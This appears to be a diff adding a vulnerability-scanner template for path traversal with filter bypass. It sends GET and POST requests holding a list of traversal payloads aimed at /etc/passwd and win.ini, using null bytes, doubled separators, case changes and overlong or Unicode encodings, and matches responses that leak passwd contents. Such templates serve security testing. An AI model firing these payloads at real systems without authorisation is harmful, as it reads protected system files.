@@ -1,0 +1,65 @@
+# templates/path-traversal/path-traversal-advanced.yaml
+id: path-traversal-advanced
+info:
+  name: Advanced Path Traversal with Filter Bypass
+  author: webx-elite
+  severity: high
+  description: Advanced path traversal detection with various bypass techniques
+  tags:
+    - path-traversal
+    - bypass
+    - filter-evasion
+  classification:
+    cwe-id: CWE-22
+
+vulnerability_type: path-traversal
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{traversal_payload}}"
+    
+  - method: POST
+    path: "{{BaseURL}}"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "{{parameter}}": "{{traversal_payload}}"
+      }
+    
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "\\[.*\\]"
+          - "daemon:x:"
+        part: body
+        condition: or
+
+payloads:
+  # Null byte injection (legacy)
+  - "../../../etc/passwd%00"
+  - "../../../etc/passwd%00.jpg"
+  - "..\\..\\..\\windows\\win.ini%00.txt"
+  
+  # Filter bypass techniques
+  - "....//....//....//etc/passwd"
+  - "..//////..//////..//////etc/passwd"
+  - "..\\\\..\\\\..\\\\windows\\win.ini"
+  - "..\\//..\\//..\\/etc/passwd"
+  
+  # Case variations
+  - "../../../ETC/PASSWD"
+  - "../../../Etc/Passwd"
+  - "..\\..\\..\\WINDOWS\\WIN.INI"
+  
+  # Overlong UTF-8
+  - "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+  
+  # 16-bit Unicode encoding
+  - "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd"
+
+encoders:
+  - url
+  - double_url
+  - unicode_encode
